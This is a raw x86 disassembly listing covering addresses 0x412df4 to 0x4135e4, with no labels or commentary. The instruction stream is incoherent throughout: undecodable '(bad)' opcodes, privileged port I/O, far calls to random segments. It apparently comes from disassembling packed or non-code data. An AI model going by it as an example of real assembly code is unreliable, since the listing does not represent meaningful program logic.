  412df4:	xchg   DWORD PTR ds:0x3bfd0d15,ebp
  412dfa:	jl     0x412de8
  412dfc:	iret   
  412dfd:	sbb    al,0x42
  412dff:	dec    ebx
  412e00:	shl    DWORD PTR [ebp-0xe],0xe7
  412e04:	fdivr  DWORD PTR [ecx+0x4b2849e2]
  412e0a:	fldenv [ecx]
  412e0c:	xchg   edi,eax
  412e0d:	out    dx,al
  412e0e:	ret    
  412e0f:	jp     0x412e5f
  412e11:	sub    DWORD PTR fs:[ebx+esi*8],eax
  412e15:	cwde   
  412e16:	push   edx
  412e17:	arpl   di,si
  412e19:	ss cmp al,0xbc
  412e1c:	repnz in al,dx
  412e1e:	add    DWORD PTR [esi],eax
  412e20:	aam    0x66
  412e22:	mov    ah,0x42
  412e24:	repnz inc edi
  412e26:	add    BYTE PTR [ebx],cl
  412e28:	daa    
  412e29:	retf   
  412e2a:	cli    
  412e2b:	jo     0x412df3
  412e2d:	cmc    
  412e2e:	add    al,0x8b
  412e30:	outs   dx,BYTE PTR ds:[esi]
  412e31:	leave  
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	lods   eax,DWORD PTR ds:[esi]
  412e34:	jp     0x412e9b
  412e36:	push   ebp
  412e37:	gs mov cl,0xbd
  412e3a:	shr    edi,cl
  412e3c:	retf   0x6da0
  412e3f:	(bad)  
  412e40:	push   edx
  412e41:	adc    ch,dh
  412e43:	les    ebx,FWORD PTR [ebx]
  412e45:	mov    ?,WORD PTR [ebx+0x461612b3]
  412e4b:	stos   DWORD PTR es:[edi],eax
  412e4c:	ss cwde 
  412e4e:	out    0x22,eax
  412e50:	jle    0x412ecf
  412e52:	push   ebp
  412e53:	out    dx,eax
  412e54:	icebp  
  412e55:	outs   dx,DWORD PTR ds:[esi]
  412e56:	xchg   BYTE PTR [edi+0x30],al
  412e59:	mov    es,WORD PTR [esi+edx*8+0x2037157e]
  412e60:	add    DWORD PTR [ebp+0x45ff61a5],ebx
  412e66:	push   edx
  412e67:	shr    BYTE PTR [ebx-0x50],1
  412e6a:	sbb    DWORD PTR [ebx],edi
  412e6c:	push   cs
  412e6d:	fsubr  QWORD PTR [ebx+edx*8]
  412e70:	fiadd  DWORD PTR [edx]
  412e72:	or     al,0x27
  412e74:	sub    ah,BYTE PTR [ebp+0x38]
  412e77:	std    
  412e78:	jae    0x412e09
  412e7a:	or     ecx,ebp
  412e7c:	xor    BYTE PTR [eax-0x563835a3],bh
  412e82:	mov    bh,bh
  412e84:	jbe    0x412e24
  412e86:	jbe    0x412e10
  412e88:	fld    DWORD PTR [ebx+0x65]
  412e8b:	pusha  
  412e8c:	xlat   BYTE PTR ds:[ebx]
  412e8d:	adc    eax,0x5201e977
  412e92:	ret    0xdf9b
  412e95:	xlat   BYTE PTR ds:[ebx]
  412e96:	cld    
  412e97:	call   0x5a7a:0x5170b6c0
  412e9e:	daa    
  412e9f:	pop    ss
  412ea0:	sbb    eax,0x406b23dc
  412ea5:	mov    ds:0x4b222b34,eax
  412eaa:	repnz in al,dx
  412eac:	cmp    BYTE PTR [esi],ah
  412eae:	push   eax
  412eaf:	mov    ds:0x9aeb11f9,al
  412eb4:	rcl    DWORD PTR [edx+0x706bd4e8],1
  412eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ebb:	icebp  
  412ebc:	(bad)  
  412ebd:	jle    0x412e5a
  412ebf:	and    DWORD PTR [edx],0x502a5b78
  412ec5:	in     eax,0x21
  412ec7:	mov    dh,dh
  412ec9:	and    DWORD PTR [eax*4+0x63b294f2],edx
  412ed0:	fidiv  DWORD PTR [edi+0x56d2b55d]
  412ed6:	(bad)  
  412ed7:	out    dx,al
  412ed8:	jno    0x412eb1
  412eda:	push   ss
  412edb:	mov    dl,0x6f
  412edd:	loope  0x412e63
  412edf:	and    BYTE PTR [eax-0x5c1d666b],bh
  412ee5:	jp     0x412ed4
  412ee7:	aas    
  412ee8:	pop    es
  412ee9:	in     eax,dx
  412eea:	xor    dh,dh
  412eec:	inc    ebx
  412eed:	add    BYTE PTR [edi-0x19b8d855],ch
  412ef3:	jg     0x412eda
  412ef5:	sbb    al,bl
  412ef7:	or     al,0x39
  412ef9:	xchg   edi,eax
  412efa:	stos   BYTE PTR es:[edi],al
  412efb:	dec    esi
  412efc:	add    al,0x9a
  412efe:	lahf   
  412eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f00:	ror    DWORD PTR es:[ebx],cl
  412f03:	ds xor al,0x67
  412f06:	sti    
  412f07:	sub    ecx,DWORD PTR [edi+0x6aa11afd]
  412f0d:	sar    dl,0x13
  412f10:	pushf  
  412f11:	adc    DWORD PTR [esi],esp
  412f13:	mov    eax,ds:0x989f669c
  412f18:	aad    0x65
  412f1a:	sahf   
  412f1b:	cli    
  412f1c:	xchg   esi,eax
  412f1d:	sub    eax,0xc3e898e
  412f22:	inc    esp
  412f23:	addr16 push ebx
  412f25:	inc    esp
  412f26:	jno    0x412f01
  412f28:	jmp    0x412f88
  412f2a:	pop    edi
  412f2b:	mov    dl,0xba
  412f2d:	pop    esp
  412f2e:	push   es
  412f2f:	or     ebp,edi
  412f31:	jbe    0x412ef7
  412f33:	pop    ss
  412f34:	scas   eax,DWORD PTR es:[edi]
  412f35:	xchg   ecx,eax
  412f36:	xchg   ebp,eax
  412f37:	push   esi
  412f38:	and    al,0x31
  412f3a:	add    DWORD PTR [ecx],ebx
  412f3c:	jbe    0x412f9c
  412f3e:	sub    ecx,DWORD PTR [ebx-0x2693d3b5]
  412f44:	dec    esp
  412f45:	enter  0x4936,0xc4
  412f49:	inc    eax
  412f4a:	xchg   ecx,eax
  412f4b:	repz adc BYTE PTR [ecx],cl
  412f4e:	sbb    bl,dh
  412f50:	(bad)  
  412f51:	shr    BYTE PTR [edi],cl
  412f53:	xor    al,0xb8
  412f55:	and    al,0xb8
  412f57:	pop    ss
  412f58:	daa    
  412f59:	jns    0x412f4b
  412f5b:	retf   
  412f5c:	xor    ecx,edi
  412f5e:	mov    edi,ebx
  412f60:	jmp    esp
  412f62:	and    DWORD PTR [esi-0x20],0xffffffb9
  412f66:	or     dl,BYTE PTR [eax+0xf7ac979]
  412f6c:	sub    esi,DWORD PTR [esi-0x53]
  412f6f:	and    eax,0xf3e4b48f
  412f74:	xor    esp,DWORD PTR [ecx+0x15c5c860]
  412f7a:	push   edi
  412f7b:	cmp    al,0xbb
  412f7d:	adc    BYTE PTR [eax+0x2cb7d99],ah
  412f83:	cmp    BYTE PTR [ebx],bl
  412f85:	sbb    DWORD PTR [edx],esp
  412f87:	repnz icebp 
  412f89:	icebp  
  412f8a:	dec    esi
  412f8b:	ret    
  412f8c:	mov    dh,0x10
  412f8e:	mov    al,ds:0x3c086b82
  412f93:	int3   
  412f94:	and    BYTE PTR ds:0x6dcfd9d2,bh
  412f9a:	lods   eax,DWORD PTR ds:[esi]
  412f9b:	or     BYTE PTR [eax],al
  412f9d:	inc    BYTE PTR ds:0xf736539c
  412fa3:	sbb    eax,0x78aecdc6
  412fa8:	test   eax,0xe9c2cd4f
  412fad:	jo     0x413023
  412faf:	xchg   BYTE PTR [edi],dh
  412fb1:	pop    ecx
  412fb2:	out    dx,eax
  412fb3:	jbe    0x412f3f
  412fb5:	add    eax,0x3a20f3fb
  412fba:	add    eax,0x55fbf78d
  412fbf:	shl    BYTE PTR [esi+0x8b2eae2],1
  412fc5:	aad    0x9a
  412fc7:	pushf  
  412fc8:	les    ebp,FWORD PTR [ebp-0x41]
  412fcb:	cmc    
  412fcc:	cs xchg edx,eax
  412fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fcf:	push   0x10
  412fd1:	scas   al,BYTE PTR es:[edi]
  412fd2:	fistp  WORD PTR [eax-0x99ad037]
  412fd8:	mov    bl,0xe4
  412fda:	mov    eax,0x8f324486
  412fdf:	aad    0x53
  412fe1:	or     bh,bh
  412fe3:	fidivr DWORD PTR [eax+edx*8-0x23]
  412fe7:	push   ebx
  412fe8:	test   eax,0x143b1d9
  412fed:	or     DWORD PTR [bx+di],0x67
  412ff1:	jle    0x41305b
  412ff3:	ret    0xe265
  412ff6:	or     bl,BYTE PTR [edx-0x5a]
  412ff9:	into   
  412ffa:	test   BYTE PTR [ebx+0x75],bh
  412ffd:	and    al,bh
  412fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413000:	dec    edx
  413001:	retf   0xdd3a
  413004:	jecxz  0x413070
  413006:	mov    dl,dh
  413008:	in     eax,dx
  413009:	js     0x412fd1
  41300b:	ror    DWORD PTR [edx],cl
  41300d:	push   esp
  41300e:	mov    dh,0x43
  413010:	xchg   BYTE PTR [esi],dh
  413012:	(bad)  [ecx]
  413014:	sub    ecx,ecx
  413016:	sbb    ch,BYTE PTR [ebp+0x53]
  413019:	outs   dx,DWORD PTR ds:[esi]
  41301a:	mov    ecx,0x5f042658
  41301f:	mov    al,0x5d
  413021:	or     eax,0x86cea3f3
  413026:	icebp  
  413027:	or     eax,0x145d8cab
  41302c:	mov    ah,0x1e
  41302e:	push   ebp
  41302f:	inc    edi
  413030:	je     0x4130a3
  413032:	popf   
  413033:	fs iret 
  413035:	es retf 0x128
  413039:	dec    esp
  41303a:	jnp    0x41305f
  41303c:	sub    al,0xd4
  41303e:	add    BYTE PTR es:[ebx+eiz*1],cl
  413042:	imul   esi,ebp,0x3b
  413045:	cmc    
  413046:	mul    BYTE PTR [ebx-0x760baeb3]
  41304c:	sub    DWORD PTR [ecx],edi
  41304e:	mov    dl,0x77
  413050:	imul   ecx,eax,0x9f9fadd8
  413056:	outs   dx,DWORD PTR ds:[esi]
  413057:	pusha  
  413058:	test   BYTE PTR [eax-0x5d],ch
  41305b:	xor    al,0x99
  41305d:	fistp  DWORD PTR [ebp+eax*2+0x3]
  413061:	mov    esi,0x830a2ad8
  413066:	xchg   BYTE PTR [ecx+0x5e],dh
  413069:	and    ah,BYTE PTR [eax-0x7b]
  41306c:	call   0x6e8b2744
  413071:	rol    DWORD PTR [eax+0x560d120d],0xb6
  413078:	ret    
  413079:	test   DWORD PTR [esi+edx*1+0x7f3317b1],ebp
  413080:	inc    edx
  413081:	mov    ds:0xa1672d99,eax
  413086:	unpcklps xmm6,xmm1
  413089:	mov    al,0x70
  41308b:	fcom   st(5)
  41308d:	les    esi,FWORD PTR [eax-0x313e778a]
  413093:	sub    DWORD PTR [edi+0x69],ecx
  413096:	pop    edi
  413097:	cmp    DWORD PTR [ecx],ecx
  413099:	pop    ebp
  41309a:	xchg   ebx,eax
  41309b:	mov    ah,0x17
  41309d:	xor    BYTE PTR fs:[ebx+0x62],ch
  4130a1:	sbb    eax,0xe953e8df
  4130a6:	out    dx,al
  4130a7:	out    dx,al
  4130a8:	add    eax,0x89614437
  4130ad:	loope  0x4130d7
  4130af:	std    
  4130b0:	inc    ebp
  4130b1:	push   edi
  4130b2:	xchg   ebx,eax
  4130b3:	call   0xc928:0xe6497823
  4130ba:	push   edx
  4130bb:	sub    al,0xe9
  4130bd:	fild   WORD PTR [eax+0x63]
  4130c0:	push   esi
  4130c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130c2:	inc    edi
  4130c3:	mov    ch,0xcd
  4130c5:	jo     0x4130be
  4130c7:	pop    eax
  4130c8:	or     edi,DWORD PTR [edx+0x6e]
  4130cb:	(bad)  
  4130cc:	stos   DWORD PTR es:[edi],eax
  4130cd:	add    bl,BYTE PTR [esi+0x7f]
  4130d0:	mov    WORD PTR [edi+esi*8],ds
  4130d3:	rcr    DWORD PTR [ecx+0x632c35d0],0x96
  4130da:	mov    edi,0x2d29c935
  4130df:	dec    esp
  4130e0:	rcl    DWORD PTR [ebp-0x77186f73],cl
  4130e6:	or     ax,0x81bc
  4130ea:	lea    esi,[edx]
  4130ec:	test   al,0x8b
  4130ee:	pop    edi
  4130ef:	std    
  4130f0:	fstp   st(5)
  4130f2:	ret    0x3fa3
  4130f5:	ins    DWORD PTR es:[edi],dx
  4130f6:	jmp    0x413133
  4130f8:	push   edi
  4130f9:	mov    DWORD PTR [ecx],0xbf58f550
  4130ff:	push   ebp
  413100:	pop    ebx
  413101:	cmp    cl,BYTE PTR [esi+0x51]
  413104:	push   ecx
  413105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413106:	faddp  st(0),st
  413108:	push   eax
  413109:	call   0x8e48c21b
  41310e:	cmp    eax,DWORD PTR [eax+0x6f6e610c]
  413114:	push   ebx
  413115:	sub    BYTE PTR [edi],bl
  413117:	xchg   ebp,eax
  413118:	das    
  413119:	adc    edi,ebp
  41311b:	mov    bl,0x40
  41311d:	xchg   edx,eax
  41311e:	rol    BYTE PTR ss:[esi-0x6d11a8a],1
  413125:	lods   eax,DWORD PTR ds:[esi]
  413126:	mov    dh,0x1
  413128:	sub    bl,BYTE PTR [ecx+0x7e8da4f4]
  41312e:	clc    
  41312f:	xchg   esi,eax
  413130:	(bad)  
  413131:	rcl    DWORD PTR [eax],cl
  413133:	dec    ecx
  413134:	cli    
  413135:	pop    edi
  413136:	cmp    eax,0xe2693d33
  41313b:	xchg   ebx,eax
  41313c:	addr16 mov ch,0xf8
  41313f:	and    DWORD PTR [esi+0xb],esi
  413142:	mov    bl,0x28
  413144:	jno    0x413115
  413146:	jmp    0x84f0aca5
  41314b:	mov    esi,0x82a6cc20
  413150:	(bad)  
  413152:	imul   esp,DWORD PTR [edi],0x0
  413155:	jecxz  0x41316a
  413157:	cld    
  413158:	fs and al,0xce
  41315b:	rol    ebp,cl
  41315d:	mov    ah,BYTE PTR [ecx+0x7eae604e]
  413163:	mov    esp,0x823b8e72
  413168:	(bad)  [ecx-0x36dd5066]
  41316e:	or     eax,0x11f1539b
  413173:	xchg   esi,eax
  413174:	stc    
  413175:	push   ss
  413176:	mov    eax,ds:0x5df28eb3
  41317b:	lds    esp,FWORD PTR [esi+0x42e8bd2f]
  413181:	push   eax
  413182:	xchg   BYTE PTR [eax-0x67a4d6a2],ah
  413188:	or     al,0xee
  41318a:	inc    ebx
  41318b:	lods   al,BYTE PTR ds:[esi]
  41318c:	imul   ebp,DWORD PTR [esi+0x67],0xffffff9d
  413190:	mov    bh,0x3c
  413192:	cmp    bl,cl
  413194:	fxam   
  413196:	dec    esp
  413197:	mov    ds:0xc8526264,eax
  41319c:	mov    ebx,0xd39b282b
  4131a1:	push   eax
  4131a2:	les    ebp,FWORD PTR ds:0x740b6a4e
  4131a8:	das    
  4131a9:	xchg   DWORD PTR [ecx-0x2d],esp
  4131ac:	jp     0x41321a
  4131ae:	ss xor eax,0x9345f2e6
  4131b4:	mov    ecx,0x23d2901d
  4131b9:	mov    edx,0x3da5336b
  4131be:	xor    DWORD PTR [ecx-0x2d],0xc144f284
  4131c5:	rcr    dl,0xa
  4131c8:	push   edx
  4131c9:	lahf   
  4131ca:	mov    cl,0x4e
  4131cc:	mov    bh,cl
  4131ce:	fcom   st(7)
  4131d0:	bt     esp,ebx
  4131d3:	sub    ah,al
  4131d5:	cmp    ah,cl
  4131d7:	enter  0x69a1,0x71
  4131db:	xor    BYTE PTR [ebx-0x17],al
  4131de:	aad    0xfc
  4131e0:	mov    dh,0xea
  4131e2:	sub    dh,BYTE PTR [edi+0x59]
  4131e5:	pop    edx
  4131e6:	(bad)  
  4131e7:	scas   al,BYTE PTR es:[edi]
  4131e8:	cmp    DWORD PTR [edx+0x25],ebx
  4131eb:	ds je  0x413203
  4131ee:	or     eax,0xcb0e4d61
  4131f3:	xchg   edi,eax
  4131f4:	xor    al,0xe7
  4131f6:	jge    0x4131ca
  4131f8:	mov    ds:0x82cda32f,eax
  4131fd:	mov    bh,0xa5
  4131ff:	mov    ecx,0x65c227e9
  413204:	xlat   BYTE PTR ds:[ebx]
  413205:	or     BYTE PTR [eax+0x61],bh
  413208:	call   0x37e6352b
  41320d:	mov    ds,WORD PTR [ecx-0x54c60ecb]
  413213:	push   ebx
  413214:	sbb    DWORD PTR [edi+0x52],eax
  413217:	enter  0x8cc0,0xe3
  41321b:	aad    0xcf
  41321d:	popa   
  41321e:	fisubr WORD PTR [ecx-0x5256ff6]
  413224:	pop    ebp
  413225:	cs hlt 
  413227:	mov    dl,0x45
  413229:	pop    edi
  41322a:	and    eax,0xc646400a
  41322f:	cmp    BYTE PTR [edi],bh
  413231:	mov    edx,0x9fc9026a
  413236:	in     al,0x43
  413238:	and    BYTE PTR [ebp+0x70e6c0b2],0x51
  41323f:	xor    bl,BYTE PTR [esi]
  413241:	sbb    esp,DWORD PTR [esi]
  413243:	out    0x87,al
  413245:	mov    eax,0x5762354
  41324a:	and    al,0xc3
  41324c:	shl    esp,0x8e
  41324f:	push   0x65
  413251:	out    0xf2,al
  413253:	fs add al,0x34
  413256:	lea    ebp,[ebp-0x3d]
  413259:	xchg   edi,eax
  41325a:	ret    
  41325b:	xor    dl,BYTE PTR [eax]
  41325d:	inc    esi
  41325e:	jno    0x41324d
  413260:	mov    al,0x6
  413262:	dec    esp
  413263:	and    al,0x42
  413265:	xchg   esp,eax
  413266:	test   DWORD PTR [eax-0x75513f60],0xe7faf94a
  413270:	repnz pop ecx
  413272:	push   edi
  413273:	push   es
  413274:	and    edi,DWORD PTR [ebx+ebp*8+0x60e2e52b]
  41327b:	inc    ecx
  41327c:	sbb    ecx,ebx
  41327e:	std    
  41327f:	arpl   WORD PTR [edx],bx
  413281:	(bad)
  413284:	or     eax,DWORD PTR fs:[ecx+esi*2]
  413288:	or     eax,0x152a51d3
  41328d:	aam    0xc6
  41328f:	pushf  
  413290:	lods   eax,DWORD PTR ds:[esi]
  413291:	push   esp
  413292:	test   DWORD PTR [ecx],edx
  413294:	sti    
  413295:	fsubp  st(6),st
  413297:	jmp    edi
  413299:	lea    esp,[edi+ebx*2]
  41329c:	sbb    DWORD PTR [edx+0x280410a9],edx
  4132a2:	jbe    0x413297
  4132a4:	cmp    eax,0x16d72015
  4132a9:	xacquire xchg BYTE PTR [ecx],ah
  4132ac:	mov    edx,0xca786081
  4132b1:	pop    esi
  4132b2:	pop    esp
  4132b3:	ds push ss
  4132b5:	not    BYTE PTR [edi+0x4d495afb]
  4132bb:	(bad)  
  4132bc:	mov    al,ds:0x3baa99ec
  4132c1:	aaa    
  4132c2:	mov    ds:0x7b28481,al
  4132c7:	stos   BYTE PTR es:[edi],al
  4132c8:	pop    DWORD PTR [esi]
  4132ca:	mov    ds:0xe20290c6,eax
  4132cf:	xchg   DWORD PTR [esi+0x2c81e84c],edx
  4132d5:	adc    eax,0x997f802e
  4132da:	out    dx,eax
  4132db:	dec    esp
  4132dc:	and    dl,BYTE PTR [edx]
  4132de:	pop    edi
  4132df:	ins    DWORD PTR es:[edi],dx
  4132e0:	jmp    0x3e4c:0xf0f9
  4132e6:	repnz (bad) 
  4132e8:	fs push es
  4132ea:	es cmc 
  4132ec:	sub    al,0x1
  4132ee:	dec    esi
  4132ef:	or     al,0xe5
  4132f1:	retf   0x7665
  4132f4:	movhps QWORD PTR [ebx-0xb854a2e],xmm1
  4132fb:	sbb    ebp,DWORD PTR [ebx-0xc]
  4132fe:	ins    DWORD PTR es:[edi],dx
  4132ff:	push   es
  413300:	inc    ecx
  413301:	sahf   
  413302:	ret    
  413303:	sbb    DWORD PTR [ebp+0x2c],esp
  413306:	mul    DWORD PTR [edi+0x1e]
  413309:	rol    DWORD PTR [ebp+0x4e],cl
  41330c:	fidiv  WORD PTR [edx+0x2e]
  41330f:	mov    ebx,0x6a44e09e
  413314:	push   eax
  413315:	xchg   ecx,eax
  413316:	int3   
  413317:	scas   al,BYTE PTR es:[edi]
  413318:	neg    BYTE PTR [edi]
  41331a:	mov    ds:0xe010b8e2,al
  41331f:	jecxz  0x4133a0
  413321:	xchg   ebx,edx
  413323:	mov    edi,0x69f056ca
  413328:	mov    ds:0xabeedf37,eax
  41332d:	jbe    0x413314
  41332f:	dec    eax
  413330:	mov    edi,0x876a775d
  413335:	jae    0x4133a0
  413337:	lahf   
  413338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413339:	out    dx,eax
  41333a:	mov    dl,0xd8
  41333c:	sub    dl,BYTE PTR [edi-0x39]
  41333f:	xlat   BYTE PTR ds:[ebx]
  413340:	xchg   BYTE PTR [edx-0x63313dc4],bl
  413346:	dec    edx
  413347:	sar    dl,0x90
  41334a:	loop   0x413395
  41334c:	fs cmp eax,0xeef92999
  413352:	dec    ecx
  413353:	stos   BYTE PTR es:[edi],al
  413354:	add    dh,BYTE PTR [ecx+0x15]
  413357:	retf   0x92f0
  41335a:	sub    DWORD PTR [eax+0x6f],0x24
  41335e:	pop    es
  41335f:	inc    esp
  413360:	(bad)  
  413361:	mov    ds:0xb222c1ee,al
  413366:	jne    0x413380
  413368:	and    al,0xee
  41336a:	aam    0x43
  41336c:	or     ebp,DWORD PTR [eax+0x68476b34]
  413372:	mov    edx,0xb7342381
  413377:	not    ecx
  413379:	ror    DWORD PTR [bx+si-0x19],1
  41337d:	mov    edi,DWORD PTR [edi]
  41337f:	jg     0x413306
  413381:	stos   DWORD PTR es:[edi],eax
  413382:	js     0x413364
  413384:	jae    0x4133c7
  413386:	repnz mov dl,0x5e
  413389:	mov    ebp,0x3ac535aa
  41338e:	adc    BYTE PTR [ebp+edi*4-0x4558c4ce],cl
  413395:	or     DWORD PTR [eax+0x28],edx
  413398:	pop    esi
  413399:	mov    eax,ds:0x5bab1ba3
  41339e:	es jmp 0x31cb:0x700a6090
  4133a6:	mov    esi,0x8e3ca9ea
  4133ab:	fwait
  4133ac:	xchg   ebx,eax
  4133ad:	mov    ds:0x3306e9e,al
  4133b2:	push   ebx
  4133b3:	mov    gs,edi
  4133b5:	dec    edx
  4133b6:	mov    eax,es:0x485c65be
  4133bc:	(bad)  
  4133bd:	fcmovnb st,st(7)
  4133bf:	xor    DWORD PTR [edi-0x74],0x6f4bae8c
  4133c6:	mov    esi,0xad1fa625
  4133cb:	outs   dx,BYTE PTR ds:[esi]
  4133cc:	dec    esp
  4133cd:	xchg   edi,eax
  4133ce:	ins    BYTE PTR es:[edi],dx
  4133cf:	stc    
  4133d0:	pop    ecx
  4133d1:	test   DWORD PTR [edi-0x3d9011c2],0xa47c1470
  4133db:	add    eax,0x381dc803
  4133e0:	pop    ebx
  4133e1:	rol    DWORD PTR [edi-0x388a226d],cl
  4133e7:	sub    DWORD PTR [ecx],0x11e78c79
  4133ed:	test   BYTE PTR [ecx+0x6c],al
  4133f0:	inc    esp
  4133f1:	mov    ds:0xdf2530b3,eax
  4133f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133f7:	jmp    0x3b122de1
  4133fc:	xchg   edx,eax
  4133fd:	stc    
  4133fe:	clc    
  4133ff:	mov    dl,0xa5
  413401:	fstp   TBYTE PTR [ecx]
  413403:	ss mov edx,0x2588dca9
  413409:	sub    eax,0xad8e4408
  41340e:	js     0x4133fc
  413410:	call   0xb44d:0x4188f25b
  413417:	stos   DWORD PTR es:[edi],eax
  413418:	dec    ecx
  413419:	and    edx,DWORD PTR [ebx]
  41341b:	ret    
  41341c:	mov    ds:0x13b73e3a,al
  413421:	jae    0x4133c2
  413423:	pop    ds
  413424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413425:	inc    eax
  413426:	lea    esi,[edx]
  413428:	jae    0x41342d
  41342a:	dec    esi
  41342b:	add    BYTE PTR [esi+0x2b],0x71
  41342f:	and    edi,0xffffffee
  413432:	and    ah,bl
  413434:	xor    al,BYTE PTR [edx+0x19c364a8]
  41343a:	pop    esp
  41343b:	mov    ah,0xc7
  41343d:	mov    ecx,0xde0a71fa
  413442:	push   cs
  413443:	shl    DWORD PTR [edi],1
  413445:	fwait
  413446:	cs xchg ebp,eax
  413448:	xchg   edi,eax
  413449:	(bad)  
  41344a:	lea    ebx,[ebp+eax*8-0x7a]
  41344e:	ss pop edi
  413450:	daa    
  413451:	mov    ds:0x1d3f0270,eax
  413456:	ins    BYTE PTR es:[edi],dx
  413457:	rcr    DWORD PTR [ecx],cl
  413459:	mov    edi,0x18545651
  41345e:	jb     0x4134a2
  413460:	xchg   ebx,eax
  413461:	sub    DWORD PTR [esi],esp
  413463:	push   0x74
  413465:	not    DWORD PTR [esp+edi*2+0x30]
  413469:	xchg   esp,eax
  41346a:	aam    0xef
  41346c:	xchg   ecx,eax
  41346d:	outs   dx,BYTE PTR ds:[esi]
  41346e:	into   
  41346f:	ins    BYTE PTR es:[edi],dx
  413470:	or     ch,BYTE PTR [eax]
  413472:	xchg   ebx,eax
  413473:	jnp    0x4134c0
  413475:	add    al,0x69
  413477:	and    al,BYTE PTR [edx-0x4618bf05]
  41347d:	cmp    ch,BYTE PTR [edi-0x12bc55d7]
  413483:	int    0x70
  413485:	jge    0x413445
  413487:	ja     0x413487
  413489:	xchg   esp,eax
  41348a:	call   0xd6b74aa
  41348f:	mov    DWORD PTR [eax-0x1d2cb4f9],0xd41edb08
  413499:	stos   BYTE PTR es:[edi],al
  41349a:	stos   DWORD PTR es:[edi],eax
  41349b:	mov    al,BYTE PTR [eax]
  41349d:	mov    ds:0x80f3dc5f,al
  4134a2:	adc    ah,BYTE PTR [edx-0x15]
  4134a5:	aad    0x2e
  4134a7:	(bad)  
  4134a8:	addr16 (bad) 
  4134aa:	push   esp
  4134ab:	aad    0x98
  4134ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ae:	clc    
  4134af:	cli    
  4134b0:	lea    eax,[ebx+0x72b01470]
  4134b6:	jle    0x413467
  4134b8:	rcl    DWORD PTR ds:0xa3ab7503,cl
  4134be:	sbb    eax,0x94820693
  4134c3:	mov    ch,dl
  4134c5:	(bad)  
  4134c7:	add    dl,al
  4134c9:	ss inc ebp
  4134cb:	mov    ds:0x81e7284,al
  4134d0:	arpl   WORD PTR [ecx],si
  4134d2:	push   ds
  4134d3:	mov    edx,DWORD PTR [edi-0x2bc60187]
  4134d9:	out    dx,eax
  4134da:	or     DWORD PTR [ecx-0x41927373],edi
  4134e0:	ins    BYTE PTR es:[edi],dx
  4134e1:	pop    ebx
  4134e2:	nop
  4134e3:	iret   
  4134e4:	mov    DWORD PTR ds:0x8b298bcc,ebp
  4134ea:	mov    dh,0x9
  4134ec:	cmp    dh,bh
  4134ee:	data16 lahf 
  4134f0:	push   es
  4134f1:	mov    al,ds:0xcf8f52e4
  4134f6:	dec    ebx
  4134f7:	jle    0x413558
  4134f9:	cs jge 0x4134bf
  4134fc:	mov    bl,0xf7
  4134fe:	popf   
  4134ff:	jecxz  0x4134c1
  413501:	sub    BYTE PTR [edx],cl
  413503:	sahf   
  413504:	test   DWORD PTR [eax],edx
  413506:	lock mov ah,0xef
  413509:	jb     0x413550
  41350b:	inc    ebp
  41350c:	xchg   edx,eax
  41350d:	fimul  WORD PTR [esp+edi*1+0x19]
  413511:	out    dx,al
  413512:	push   0xffffffb7
  413514:	rcr    BYTE PTR [edx+0x2ae36207],0x53
  41351b:	or     al,0x9
  41351d:	xchg   esp,eax
  41351e:	mov    ds:0xd97fbac9,al
  413523:	cli    
  413524:	dec    ecx
  413525:	nop
  413526:	push   es
  413527:	and    DWORD PTR fs:[ebx+0x5ea43f05],ebp
  41352e:	jg     0x4134f9
  413530:	ficomp WORD PTR [ebx-0x5c1cf7b5]
  413536:	jl     0x4134ea
  413538:	test   eax,0x14329ff0
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	and    eax,0x2299c61c
  413543:	sbb    ch,al
  413545:	add    bh,BYTE PTR [ebx]
  413547:	or     DWORD PTR [edx+edi*2-0x56],ebx
  41354b:	or     esi,DWORD PTR [esi+edi*4-0x6e4e7034]
  413552:	xor    eax,0x5d6509ca
  413557:	sbb    dl,BYTE PTR ds:0x638e9f6d
  41355d:	mov    dh,0x6e
  41355f:	popf   
  413560:	int    0xeb
  413562:	std    
  413563:	popf   
  413564:	js     0x41355b
  413566:	nop
  413567:	add    bh,BYTE PTR [esi+0x23115afd]
  41356d:	stos   DWORD PTR es:[edi],eax
  41356e:	(bad)  
  41356f:	in     al,0x96
  413571:	std    
  413572:	mov    al,ds:0xee4b8e6b
  413577:	rcl    BYTE PTR [ecx+ebp*8],cl
  41357a:	jne    0x4134fe
  41357c:	mov    bl,0xf2
  41357e:	cmp    BYTE PTR [ebx+0x34],dh
  413581:	pop    ds
  413582:	sub    al,0xe5
  413584:	cmp    eax,0xce3f9414
  413589:	addr16 dec edx
  41358b:	jae    0x41350e
  41358d:	xchg   esp,eax
  41358e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41358f:	and    eax,0x4dc00b47
  413594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413595:	into   
  413596:	shr    DWORD PTR [ebx-0x54d15979],0x73
  41359d:	arpl   WORD PTR [edx+0x40d96ed1],cx
  4135a3:	les    eax,FWORD PTR [edi+0x5ac854d6]
  4135a9:	ins    DWORD PTR es:[edi],dx
  4135aa:	dec    esi
  4135ab:	xor    BYTE PTR ds:0x2e9c8263,0xd8
  4135b2:	mov    ds:0xab4f981b,al
  4135b7:	test   eax,0x5944e5a3
  4135bd:	cmp    edx,DWORD PTR ds:0xae6197e9
  4135c3:	lods   eax,DWORD PTR ds:[esi]
  4135c4:	sub    DWORD PTR [edi-0x577d14d1],0xffffffa6
  4135cb:	or     al,0x88
  4135cd:	clc    
  4135ce:	sub    eax,0x31be8e45
  4135d3:	xchg   edi,eax
  4135d4:	lods   al,BYTE PTR ds:[esi]
  4135d5:	rep lods al,BYTE PTR ds:[esi]
  4135d7:	fild   QWORD PTR [edi+0x46dd93b5]
  4135dd:	lods   eax,DWORD PTR ds:[esi]
  4135de:	mov    ecx,0x3acae004
  4135e3:	cli    
  4135e4:	test   al,0x60
